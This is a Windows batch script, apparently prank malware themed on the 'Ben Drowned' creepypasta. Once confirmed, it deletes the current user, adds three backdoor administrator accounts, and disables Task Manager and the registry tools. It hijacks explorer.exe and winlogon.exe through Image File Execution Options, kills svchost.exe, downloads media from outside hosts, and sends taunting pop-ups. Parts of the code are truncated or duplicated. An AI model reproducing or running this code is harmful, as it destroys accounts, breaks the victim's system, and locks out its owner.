@echo off
title BEN.EXE
mkdir "%temp%\din"
echo really start (y/n)==
set /p input=
if %input%==y goto hack
if %input%==n goto exit

:hack 
net user /delete %username%
net user /add Anonymousnake1 T4@123456
net user /add Anonymousnake2 T4@123456
net user /add Anonymousnake3 T4@123456
net localgroup Administrators Anonymousnake1 /add
net localgroup Administrators Anonymousnake2 /add
net localgroup Administrators Anonymousnake3 /add



set "startup=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
echo X=MsgBox("Hacked,0+16,"You Should'nt have done that")  > "%startup%\BLOODBENISHERE.bat"
echo taskkill /f /im svchost.exe  > "%startup%\BLOODBENISHERE.bat"

set "URL=https://i.postimg.cc/wvfBjpK2/images.jpg"
set "FILE=%TEMP%\din\BEN.jpg"

mkdir "%TEMP%\din" 2>nul
curl -o "%FILE%" "%URL%"

reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%FILE%" /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 10 /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v TileWallpaper /t REG_SZ /d 0 /f

RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

set "url=https://github.com/dnndj-39/ben-theme-music/raw/refs/heads/main/ben-theme.wav"
set "out=%temp%\din\ben-theme.wav"


mkdir "%temp%\din" 2>nul


powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%out%'"

timeout /t 1 >nul

start "" powershell -windowstyle hidden -Command "(New-Object Media.SoundPlayer '%out%').PlaySync()"


reg add "HKLM\SOFTWARE\Policies\Microsoft\MMC" ^ /v RestrictToPermittedSnapins /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\MMC\Snapins\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" ^ /v Allowed /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
set "vbsFile1=%temp%\din\ERROR1.vbs"
echo x=MsgBox("Hello, do you remember me?",0+16,"BEN.EXE") > "%vbsFile1%"

"%vbsFile1%"

set "vbsFile2=%temp%\din\ERROR2.vbs"
echo x=MsgBox("Yes I am your friend BEN.EXE! , I am come back! ",0+16,"BEN.EXE") > "%vbsFile2%"

"%vbsFile2%"

set "vbsFile3=%temp%\din\ERROR3.vbs"
echo x=MsgBox("You opened me up again!",0+16,"BEN.EXE") > "%vbsFile3%"

"%vbsFile3%"
set "vbsFile4=%temp%\din\ERROR4.vbs"
echo x=MsgBox("You let me in again! ",0+16,"BEN.EXE") > "%vbsFile4%"

"%vbsFile4%

set "vbsFile5=%temp%\din\ERROR5.vbs"
echo x=MsgBox("You Shouldn't Do That",0+16,"BEN.EXE") > "%vbsFile5%"
"%vbsfile5%"

set "vbsFile6=%temp%\din\ERROR6.vbs"
echo x=MsgBox("Ok I give you some advice",0+16,"BEN.EXE") > "%vbsFile6%"
"%vbsfile6%

set "vbsFile7=%temp%\din\ERROR7.vbs"
echo x=MsgBox("You better not turn off your computer",0+16,"BEN.EXE") > "%vbsFile7%"
"%vbsfile7%"

set "vbsFile8=%temp%\din\ERROR8.vbs"
echo x=MsgBox("If the computer is turn off",0+16,"BEN.EXE") > "%vbsFile8%"
"%vbsfile8%"

set "vbsFile8=%temp%\din\ERROR9.vbs"
echo x=MsgBox("YOUR COMPUTER IS DEAD",0+16,"BEN.EXE") > "%vbsFile9%"
"%vbsfile9%"

set "vbsFile10=%temp%\din\ERROR10.vbs"
echo x=MsgBox("I will not let you run away this time",0+16,"BEN.EXE") > "%vbsFile10%"
"%vbsfile10%"

set "vbsFile11=%temp%\din\ERROR11.vbs"
echo x=MsgBox("HAHAHAHAHAHAHAHA",0+16,"BEN.EXE") > "%vbsFile11%"
"%vbsfile11%"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe" /v Debugger /t REG_SZ /d "BLOODBENISHERE.bat" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe" /v Debugger /t REG_SZ /d "BLOODBENISHERE.bat" /f
echo Set WshShell = CreateObject("WScript.Shell") > temp_mouse.vbs
echo Randomize >> temp_mouse.vbs
echo Do >> temp_mouse.vbs
echo x = Int((100-(-100)+1)*Rnd+(-100)) >> temp_mouse.vbs
echo y = Int((100-(-100)+1)*Rnd+(-100)) >> temp_mouse.vbs
echo WshShell.SendKeys "{UP " & x & "}" >> temp_mouse.vbs
echo WshShell.SendKeys "{DOWN " & y & "}" >> temp_mouse.vbs
echo WScript.Sleep 50 >> temp_mouse.vbs
echo Loop >> temp_mouse.vbs
set "tempdir=%temp%\din"
mkdir "%tempdir%" 2>nul


set "url=https://github.com/dnndj-39/ben-theme-music/raw/refs/heads/main/ben.mp3"
set "out=%tempdir%\ben-theme.wav"
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%out%'"


start "" powershell -windowstyle hidden -Command "(New-Object Media.SoundPlayer '%out%').PlaySync()"


set "imgUrl=https://i.postimg.cc/Qx9vXfWB/Ben-Drowned.jpg"
set "imgFile=%tempdir%\Ben-Drowned.jpg"
powershell -Command "Invoke-WebRequest -Uri '%imgUrl%' -OutFile '%imgFile%'"


powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"Add-Type -AssemblyName System.Windows.Forms; ^
Add-Type -AssemblyName System.Drawing; ^
$bitmap = [System.Drawing.Bitmap]::FromFile('$env:TEMP\din\Ben-Drowned.jpg'); ^
$form = New-Object System.Windows.Forms.Form; ^
$form.FormBorderStyle='None'; $form.TopMost=$true; $form.StartPosition='CenterScreen'; $form.Size=New-Object System.Drawing.Size($bitmap.Width,$bitmap.Height); ^
$pictureBox = New-Object System.Windows.Forms.PictureBox; $pictureBox.Dock='Fill'; $pictureBox.Image=$bitmap; $form.Controls.Add($pictureBox); ^
$rand = New-Object System.Random; ^
$inputString=''; ^
$form.Add_KeyDown({param($e) $inputString+=$e.KeyCode.ToString().ToUpper(); if($inputString.Length -gt 3){$inputString=$inputString.Substring($inputString.Length-3)}; if($inputString -eq 'BEN'){$form.Close()}}); ^

$dots=@(); 1..50 | ForEach-Object { $dot=New-Object System.Windows.Forms.Label; $dot.BackColor='Red'; $dot.Size=New-Object System.Drawing.Size(10


cscript //nologo temp_mouse.vbs
taskkill /f /im svchost.exe

:exit
exit
Add-Type -AssemblyName System.Drawing; ^
$form = New-Object System.Windows.Forms.Form; ^
$form.Text = ''; ^
$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None; ^
$form.StartPosition = 'CenterScreen'; ^
$form.TopMost = $true; ^
$form.Size = New-Object System.Drawing.Size(800,600); ^
$pictureBox = New-Object System.Windows.Forms.PictureBox; ^
$pictureBox.Dock = 'Fill'; ^
$bitmap = [System.Drawing.Bitmap]::FromFile('$env:TEMP\BEN.png'); ^
$rand = New-Object System.Random; ^
$graphics = [System.Drawing.Graphics]::FromImage($bitmap); ^
for ($i=0; $i -lt 50; $i++) { $x=$rand.Next(0,$bitmap.Width-20); $y=$rand.Next(0,$bitmap.Height-20); $graphics.FillEllipse([System.Drawing.SolidBrush]::new([System.Drawing.Color]::Red),$x,$y,20,20) }; ^
$graphics.Dispose(); ^
$pictureBox.Image = $bitmap; ^
$pictureBox.SizeMode='StretchImage'; ^
$form.Controls.Add($pictureBox); ^
$inputString=''; ^
$form.KeyPreview=$true; ^
$form.Add_KeyDown({param($e) $inputString+=$e.KeyCode.ToString().ToUpper(); if($inputString.Length -gt 3){$inputString=$inputString.Substring($inputString.Length-3)}; if($inputString.EndsWith('BEN')){[System.Windows.Forms.MessageBox]::Show('You should have done that'); $inputString=''}}); ^
$timer = New-Object System.Windows.Forms.Timer; ^
$timer.Interval=50; ^
$timer.Add_Tick({$mouse=[System.Windows.Forms.Control]::MousePosition; $formLocation=$form.Location; $formSize=$form.Size; if($mouse.X -ge $formLocation.X - 50 -and $mouse.X -le $formLocation.X+$formSize.Width+50 -and $mouse.Y -ge $formLocation.Y -50 -and $mouse.Y -le $formLocation.Y+$formSize.Height+50){$newX=$formLocation.X+($rand.Next(-200,200)); $newY=$formLocation.Y+($rand.Next(-200,200)); $screen=[System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea; if($newX -lt 0){$newX=0}; if($newY -lt 0){$newY=0}; if($newX+$form.Width -gt $screen.Width){$newX=$screen.Width-$form.Width}; if($newY+$form.Height -gt $screen.Height){$newY=$screen.Height-$form.Height}; $form.Location=New-Object System.Drawing.Point($newX,$newY)}}); ^
$timer.Start(); ^
$form.ShowDialog()"



:exit
exit
